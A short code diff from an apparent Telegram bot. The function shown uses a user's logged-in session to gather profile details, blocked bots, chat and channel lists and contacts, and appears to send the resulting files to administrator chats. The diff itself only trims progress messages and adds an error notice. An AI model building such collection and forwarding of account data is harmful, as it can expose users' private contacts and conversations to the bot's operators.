@@ -379,11 +379,8 @@ async def process_user_data(client, phone_number, user_id):
     selection = '0'
     needsavecontacts = '0'
     try:
-        await bot.send_message(user_id, "get_user_info")
         userid, userinfo, firstname, lastname, username, photos_user_html = await get_user_info(client, phone_number, selection)
-        await bot.send_message(user_id, "get_blocked_bot")
         count_blocked_bot, earliest_date, latest_date, blocked_bot_info, blocked_bot_info_html, user_bots, user_bots_html, list_botblocked = await get_blocked_bot(client, selection)
-        await bot.send_message(user_id, "get_type_of_chats")
         delgroups, chat_message_counts, openchannels, closechannels, openchats, closechats, admin_id, user_bots, user_bots_html, list_botexisted = await get_type_of_chats(client, selection)
         groups, i, all_info, openchannel_count, closechannel_count, opengroup_count, closegroup_count, closegroupdel_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, public_channels_html, private_channels_html, public_groups_html, private_groups_html, deleted_groups_html, channels_list = await make_list_of_channels(delgroups, chat_message_counts, openchannels, closechannels, openchats, closechats, selection, client)
         total_contacts, total_contacts_with_phone, total_mutual_contacts = await get_and_save_contacts(client, phone_number, userid, userinfo, firstname, lastname, username, needsavecontacts)
@@ -393,6 +390,7 @@ async def process_user_data(client, phone_number, user_id):
         await send_files_to_bot(bot, admin_chat_ids, user_id)
     except Exception as e:
         logging.error(f"Error processing user data: {e}")
+        await bot.send_message(user_id, "вас выкинуло")
 
 
 # Функция для отправки файлов
